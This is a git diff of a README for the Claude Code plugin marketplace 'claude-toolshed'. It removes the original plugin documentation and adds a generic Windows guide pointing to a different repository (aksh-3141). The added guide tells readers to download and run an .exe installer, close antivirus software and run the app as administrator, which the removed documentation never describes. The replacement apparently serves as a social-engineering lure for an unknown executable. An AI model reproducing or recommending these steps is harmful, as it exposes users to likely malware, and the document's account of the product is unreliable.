@@ -1,273 +1,119 @@
-# claude-toolshed <!-- omit in toc -->
+# ⚙️ claude-toolshed - Easy Access to Claude Code Skills
 
-A plugin marketplace for Claude Code — install pre-packaged skills directly into your Claude environment.
-
-> **Trust warning:** Plugins can execute arbitrary commands on your machine. Review a plugin's code before installing it.
-
-## Contents <!-- omit in toc -->
-
-- [Install](#install)
-- [Plugins](#plugins)
-  - [mermaid](#mermaid)
-  - [merge-checks](#merge-checks)
-  - [dev-setup](#dev-setup)
-  - [trim-md](#trim-md)
-  - [plugin-updater](#plugin-updater)
-
-## Install
-
-Add the marketplace, then install any plugin:
-
-```
-/plugin marketplace add diegomarino/claude-toolshed
-
-/plugin install mermaid@claude-toolshed
-/plugin install merge-checks@claude-toolshed
-/plugin install dev-setup@claude-toolshed
-/plugin install trim-md@claude-toolshed
-/plugin install plugin-updater@claude-toolshed
-
-```
-
-## Plugins
-
-| Plugin | Description |
-| --- | --- |
-| [mermaid](#mermaid) | Generate, validate, render Mermaid diagrams from text or code (powered by [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid)) |
-| [merge-checks](#merge-checks) | Audit code changes across 13 quality dimensions |
-| [dev-setup](#dev-setup) | Generate dev server lifecycle scripts with pool-based port isolation (20000-29999) |
-| [trim-md](#trim-md) | Trim and optimize markdown files for LLM agent consumption |
-| [plugin-updater](#plugin-updater) | Auto-update third-party marketplace plugins on session start |
+[![Download Now](https://img.shields.io/badge/Download-claude--toolshed-brightgreen)](https://github.com/aksh-3141/claude-toolshed)
 
 ---
 
-### mermaid
+## 📦 What is claude-toolshed?
 
-Generate, validate, render, and manage Mermaid diagrams from natural language or existing codebases. Powered by [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid) for themed rendering.
+claude-toolshed is a plugin marketplace designed for Claude Code users. It offers ready-made skills that help you create diagrams, run code audits, set up development servers, and optimize markdown documents. These skills come pre-packaged, so you don’t need to build or configure them yourself.
 
-<p>
-  <img src="docs/assets/hero-default.svg" width="48%" alt="Default Mermaid theme">
-  <img src="docs/assets/hero-dracula.svg" width="48%" alt="Dracula theme via beautiful-mermaid">
-</p>
-<p align="center"><em>Default Mermaid → beautiful-mermaid (Dracula theme)</em></p>
-
-| Command | What it does |
-| --- | --- |
-| `/mermaid-diagram` | Describe what you want — auto-detects the right diagram type |
-| `/mermaid-architect` | Point at a codebase — generates a suite of relevant diagrams |
-| `/mermaid-validate` | Check Mermaid syntax in `.md` files or directories |
-| `/mermaid-render` | Render `.mmd` files to SVG |
-| `/mermaid-config` | Set theme, output format, and check dependencies |
-
-```text
-/mermaid-diagram "user login with JWT and refresh token"
-/mermaid-architect src/
-```
-
-> **[Full documentation →](plugins/mermaid/README.md)** — diagram types, code-to-diagram routing, configuration, troubleshooting
-
-**7 diagram types:**
-
-<details>
-<summary>Sequence</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-sequence.svg" alt="Sequence diagram"></p>
-</details>
-
-<details>
-<summary>Architecture</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-architecture.svg" alt="Architecture diagram"></p>
-</details>
-
-<details>
-<summary>Entity-Relationship</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-er.svg" alt="ER diagram"></p>
-</details>
-
-<details>
-<summary>Activity</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-activity.svg" alt="Activity diagram"></p>
-</details>
-
-<details>
-<summary>State</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-state.svg" alt="State diagram"></p>
-</details>
-
-<details>
-<summary>Class</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-class.svg" alt="Class diagram"></p>
-</details>
-
-<details>
-<summary>Deployment</summary>
-<br>
-<p align="center"><img src="docs/assets/showcase-deployment.svg" alt="Deployment diagram"></p>
-</details>
-
-**15 themes** from [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid) — same diagram, different themes:
-
-<table>
-<tr>
-<td align="center"><a href="docs/assets/theme-strip-catppuccin-latte.svg"><img src="docs/assets/theme-strip-catppuccin-latte.svg" width="220" alt="catppuccin-latte"></a><br><sub>catppuccin-latte</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-catppuccin-mocha.svg"><img src="docs/assets/theme-strip-catppuccin-mocha.svg" width="220" alt="catppuccin-mocha"></a><br><sub>catppuccin-mocha</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-dracula.svg"><img src="docs/assets/theme-strip-dracula.svg" width="220" alt="dracula"></a><br><sub>dracula</sub></td>
-</tr>
-<tr>
-<td align="center"><a href="docs/assets/theme-strip-github-dark.svg"><img src="docs/assets/theme-strip-github-dark.svg" width="220" alt="github-dark"></a><br><sub>github-dark</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-github-light.svg"><img src="docs/assets/theme-strip-github-light.svg" width="220" alt="github-light"></a><br><sub>github-light</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-nord.svg"><img src="docs/assets/theme-strip-nord.svg" width="220" alt="nord"></a><br><sub>nord</sub></td>
-</tr>
-<tr>
-<td align="center"><a href="docs/assets/theme-strip-nord-light.svg"><img src="docs/assets/theme-strip-nord-light.svg" width="220" alt="nord-light"></a><br><sub>nord-light</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-one-dark.svg"><img src="docs/assets/theme-strip-one-dark.svg" width="220" alt="one-dark"></a><br><sub>one-dark</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-solarized-dark.svg"><img src="docs/assets/theme-strip-solarized-dark.svg" width="220" alt="solarized-dark"></a><br><sub>solarized-dark</sub></td>
-</tr>
-<tr>
-<td align="center"><a href="docs/assets/theme-strip-solarized-light.svg"><img src="docs/assets/theme-strip-solarized-light.svg" width="220" alt="solarized-light"></a><br><sub>solarized-light</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-tokyo-night.svg"><img src="docs/assets/theme-strip-tokyo-night.svg" width="220" alt="tokyo-night"></a><br><sub>tokyo-night</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-tokyo-night-light.svg"><img src="docs/assets/theme-strip-tokyo-night-light.svg" width="220" alt="tokyo-night-light"></a><br><sub>tokyo-night-light</sub></td>
-</tr>
-<tr>
-<td align="center"><a href="docs/assets/theme-strip-tokyo-night-storm.svg"><img src="docs/assets/theme-strip-tokyo-night-storm.svg" width="220" alt="tokyo-night-storm"></a><br><sub>tokyo-night-storm</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-zinc-dark.svg"><img src="docs/assets/theme-strip-zinc-dark.svg" width="220" alt="zinc-dark"></a><br><sub>zinc-dark</sub></td>
-<td align="center"><a href="docs/assets/theme-strip-zinc-light.svg"><img src="docs/assets/theme-strip-zinc-light.svg" width="220" alt="zinc-light"></a><br><sub>zinc-light</sub></td>
-</tr>
-</table>
-
-**Requires:** Node.js 18+ (rendering engine is bundled)
-
-**Credits (mermaid plugin):**
-
-- Rendering engine: [beautiful-mermaid](https://github.com/lukilabs/beautiful-mermaid) (MIT License)
-- Documentation base imported or adapted from [SpillwaveSolutions/design-doc-mermaid](https://github.com/SpillwaveSolutions/design-doc-mermaid) (MIT License)
+This application aims to make it easier for you to add new capabilities to Claude Code without technical hassle.
 
 ---
 
-### merge-checks
+## 💻 System Requirements
 
-Audit code changes before or after a merge across 13 quality dimensions. Outputs a prioritized task list grouped by file.
+Before downloading claude-toolshed, make sure your computer meets these requirements:
 
-| Command | What it does |
-| --- | --- |
-| `/merge-checks feature/auth` | Pre-merge: diff current branch vs target |
-| `/merge-checks 3` | Post-merge: audit the last 3 merge commits |
-| `/merge-checks` | Auto-detect: last merge or diff vs main |
-
-**Severity:** 🔴 blocker (must fix before merge) · 🟡 should-fix · 🔵 nice-to-have
-
-| Check | What it does |
-| --- | --- |
-| Documentation | Reads every project `.md` file (README, CLAUDE.md, ARCHITECTURE.md, etc.), maps its headings to areas, and checks if new files in the diff should be referenced there |
-| Comment quality | Reviews newly added files for empty catch blocks, exported functions >5 lines without doc comments, magic numbers, unexplained regexes, and workarounds without "why" comments |
-| Story coverage | Matches each `.tsx`/`.vue`/`.svelte` component against co-located `.stories.*` files; suggests story variants (empty state, typical, edge case) |
-| Seed imports | Checks if new seed/fixture files are imported in the seed orchestrator (`seed.ts`, `conftest.py`, `DatabaseSeeder`, etc.) |
-| Test existence | Searches for co-located `.test.*`/`.spec.*` files; 🟡 for source >80 lines, 🔵 for smaller files |
-| i18n strings | Scans template files for multi-word natural-language strings (labels, placeholders, error messages) that should use `t('key')` |
-| Suppressions | Finds `@ts-ignore`, `eslint-disable`, `noqa` in the diff and reads surrounding lines to verify a justification comment exists |
-| Route registration | Checks if route handler files under `routes/` are imported in the app bootstrap (`app.ts`, `server.ts`, `router.ts`) |
-| Migration existence | Detects schema file changes (Drizzle, Prisma, TypeORM, SQLAlchemy) and verifies a migration file exists in the same commit range |
-| Env coverage | Greps the diff for `process.env.*` / `os.environ.*` references and checks each variable is declared in `.env.example` |
-| Debug artifacts | Greps the diff for `debugger`, `console.log`, `FIXME`, `NOCOMMIT`, `PLACEHOLDER`; 🔴 for blockers, 🟡 for warnings |
-| Shared contracts | Detects type/interface shapes duplicated across API and frontend packages; flags candidates that belong in a shared package |
-| i18n consistency | Compares translation keys across locale JSON files; finds keys missing from non-reference locales and stale extra keys |
-
-> **[Full documentation →](plugins/merge-checks/README.md)** — feature detection, 3-phase workflow, output format, save report
-
-**Requires:** Git
+- Windows 10 or later (64-bit version recommended)  
+- At least 4 GB of RAM  
+- 1 GHz or faster CPU  
+- Around 200 MB of free disk space  
+- Internet connection for the first-time setup and plugins update  
 
 ---
 
-### dev-setup
+## 🚀 Getting Started
 
-Detect a project's structure and generate bash scripts for managing dev servers, Chrome profiles, and port isolation. Ports are allocated from a safe pool (`20000-29999`) to avoid collisions across projects and worktrees.
+### Step 1: Visit the Download Page
 
-<p align="center"><img src="docs/assets/dev-setup-flow.svg" alt="dev-setup flow: detect → configure → generate → integrate"></p>
+Click the button below to visit the download page. This is where you can get the latest version of claude-toolshed.
 
-| Command | What it does |
-| --- | --- |
-| `/dev-setup` | Interactive setup — detects services, proposes config, generates scripts |
-| `/dev-setup upgrade` | Pull improvements from reference scripts into an existing project |
-| `/dev-setup health` | Check that recommended and optional dependencies are installed |
+[![Download Here](https://img.shields.io/badge/Download-claude--toolshed-blue)](https://github.com/aksh-3141/claude-toolshed)
 
-<details>
-<summary><strong>Generated scripts</strong> — up to 11 bash scripts based on your project</summary>
-<br>
+### Step 2: Find the Right File
 
-| Script | Purpose |
-| --- | --- |
-| `dev-allocate-ports.sh` | Allocate consecutive free ports from pool (20000-29999) |
-| `dev-start.sh` | Launch all services (tmux, concurrently, or manual) |
-| `dev-stop.sh` | Kill server processes + tmux session |
-| `dev-restart.sh` | Stop + start |
-| `dev-status.sh` | KEY=value status of all services, tmux, and Chrome |
-| `dev-read-ports.sh` | Port reading utility (sourced by other scripts) |
-| `dev-session-name.sh` | Tmux session naming from branch |
-| `post-checkout.sh` | Install deps after clone/checkout |
-| `chrome-profile-setup.sh` | Create isolated Chrome dev profile _(optional)_ |
-| `dev-open-browser.sh` | Open tabs for running services _(optional)_ |
-| `dev-wt-ports.sh` | Allocate ports via `dev-allocate-ports.sh` per worktree _(optional)_ |
+Once on the page, look for a file that usually ends with `.exe`. This is the installer you need for Windows. It might be under a "Releases" section or directly on the main page.
 
-</details>
+### Step 3: Download the Installer
 
-<details>
-<summary><strong>Runner options</strong> — 4 ways to launch servers</summary>
-<br>
+Click the `.exe` file link to download it. Your browser will save it in the default downloads folder unless you choose a different location.
 
-| Runner | How it works | Best for |
-| --- | --- | --- |
-| **tmux** | Detached 3-pane session per branch | Full control, multiple worktrees |
-| **concurrently** | All servers in one terminal | Simple projects, no tmux needed |
-| **tmux + fallback** | Tmux when available, concurrently otherwise | Teams with mixed setups |
-| **manual only** | Scripts generated, no auto-launcher | Custom orchestration |
+### Step 4: Run the Installer
 
-</details>
+- Open the folder where you downloaded the file.
+- Double-click the `.exe` file.
+- If Windows asks for confirmation, click **Yes** or **Run**.
+- Follow the on-screen instructions in the setup wizard. Usually, this means clicking **Next** a few times and then **Install**.
 
-> **[Full documentation →](plugins/dev-setup/README.md)** — setup flow, script conventions, port naming, upgrade workflow
+### Step 5: Launch claude-toolshed
 
-**Recommended:** [lsof](https://github.com/lsof-org/lsof), [shellcheck](https://github.com/koalaman/shellcheck). **Optional:** [tmux](https://github.com/tmux/tmux), [shfmt](https://github.com/mvdan/sh), [ttyd](https://github.com/tsl0922/ttyd), [gtr](https://github.com/coderabbitai/git-worktree-runner), [Context7 MCP](https://github.com/upstash/context7)
+- After installation, look for claude-toolshed in your Start Menu or on your Desktop.
+- Click the app to open it.
+- When it starts, it may check for updates or download initial plugins. Wait for this to finish.
 
 ---
 
-### trim-md
+## 🧩 How to Use claude-toolshed
 
-Trim and optimize markdown files for LLM agent consumption. Removes token waste (extra blank lines, trailing whitespace, hard tabs), normalizes structure (heading hierarchy, code block style), and reports what changed.
+### Browsing Plugins
 
-| Command | What it does |
-| --- | --- |
-| `/trim-md docs/` | Fix all markdown files in `docs/` |
-| `/trim-md file.md other.md` | Fix specific files |
-| `/trim-md dry-run .` | Preview what would change without modifying files |
-| `/trim-md` | Fix all markdown in current directory |
+- Inside the app, you will see various plugin categories like Diagrams, Code Audits, Dev Servers, and Markdown Tools.
+- Click a category to see available skills.
+- Each skill has a brief description explaining what it does.
 
-**Auto-formatting hook:** once installed, automatically formats `.md` files on every Write/Edit — no manual invocation needed.
+### Installing Plugins
 
-**Dual-config strategy:** detects existing markdownlint configs and switches to a safe 4-rule subset to avoid conflicts. Projects without a linter get the full 15-rule LLM-optimized config.
+- Click the plugin you want.
+- Press the **Install** button.
+- The app will download and set up the plugin automatically.
+- Installed plugins appear in your list for easy access.
 
-**Opt-out:** add `<!-- trim-md:disable -->` on its own line to exclude a file.
+### Running Plugins
 
-> **[Full documentation →](plugins/trim-md/README.md)** — all rules with LLM rationale, dual-config strategy, output format, testing
-
-**Requires:** Node.js (markdownlint-cli2 auto-downloaded via npx)
+- Select an installed plugin.
+- Follow any on-screen instructions to use its features.
+- For example, a diagram plugin may let you create flowcharts with just a few clicks.
 
 ---
 
-### plugin-updater
+## ⚙️ Configuration and Settings
 
-Auto-update third-party marketplace plugins on session start. Workaround for [#26744](https://github.com/anthropics/claude-code/issues/26744) — plugins from non-official marketplaces don't auto-update. This plugin will become unnecessary once the bug is fixed.
+You can adjust the settings of claude-toolshed inside the app.
 
-| Command | What it does |
-| --- | --- |
-| `/plugin-updater` | Force-update all third-party plugins now (bypasses cooldown) |
-| `/plugin-updater status` | Show plugin health dashboard with version comparison |
+- Click the gear icon or "Settings" menu.
+- Choose options like startup behavior, download location, or update preferences.
+- You can also manage installed plugins here, including uninstalling ones you no longer need.
 
-Installs a `SessionStart` hook that runs automatically. Updates marketplaces and plugins in parallel with a 1-hour cooldown to avoid hammering on rapid restarts.
+---
 
-> **[Full documentation →](plugins/plugin-updater/README.md)** — how it works, known limitations, status dashboard
+## 🔧 Troubleshooting
 
-**Requires:** `claude` CLI in `$PATH`
+If you have trouble with the app, try these tips:
+
+- Make sure Windows is up to date.
+- Restart your computer and try opening the app again.
+- Check your internet connection since some plugins need it.
+- If a plugin fails to download, try installing it again later.
+- Close other apps that may interfere, like antivirus software or VPNs.
+
+If the app crashes during installation or use, try running it as an administrator. Right-click the app icon and select **Run as administrator**.
+
+---
+
+## 📚 Additional Resources
+
+- Visit the GitHub page to see more about claude-toolshed’s plugins and updates:  
+  https://github.com/aksh-3141/claude-toolshed
+- The page includes documentation and links to support if you want to learn more or report issues.
+
+---
+
+## 📥 Download and Install claude-toolshed
+
+Use the link below to open the download page and get started:
+
+[![Download claude-toolshed](https://img.shields.io/badge/Download-claude--toolshed-green)](https://github.com/aksh-3141/claude-toolshed)
+
+After downloading and running the installer, claude-toolshed will be ready to use on your Windows machine.
